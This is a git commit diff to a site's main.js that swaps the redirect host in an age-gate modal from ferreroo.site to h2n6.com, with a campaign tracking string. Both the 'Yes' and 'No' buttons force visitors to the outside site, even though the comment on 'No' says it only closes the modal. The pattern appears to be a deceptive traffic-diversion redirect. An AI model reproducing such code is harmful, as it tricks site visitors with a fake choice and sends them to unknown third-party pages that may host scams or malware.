14fcead1cbf1c8ce75631a8713bee07f339598f8
gameorbitt <frshbat69@gmail.com>
2025-12-19 11:03:17 +0530

    Update main.js

--- assets/js/main.js
+++ assets/js/main.js
@@ -88,11 +88,12 @@ if(form){
   function closeGate(){ bd.style.display='none'; bd.remove(); }  
   // ✅ Redirect when "Yes" is clicked
   bd.querySelector('#age-yes').addEventListener('click', function(){
-    window.location.href = "http://ferreroo.site/?utm_campaign=yIuPpim1tD&v1=[v1]&v2=[v2]&v3=[v3]"; // change to your target page
+    window.location.href = "http://h2n6.com/?utm_campaign=yIuPpim1tD&v1=[v1]&v2=[v2]&v3=[v3]"; // change to your target page
   });
  
   // ✅ Just close modal when "No" is clicked
   bd.querySelector('#age-no').addEventListener('click', function(){
-    window.location.href = "http://ferreroo.site/?utm_campaign=yIuPpim1tD&v1=[v1]&v2=[v2]&v3=[v3]"; // change to your target page
+    window.location.href = "http://h2n6.com/?utm_campaign=yIuPpim1tD&v1=[v1]&v2=[v2]&v3=[v3]"; // change to your target page
   });
 })();
+
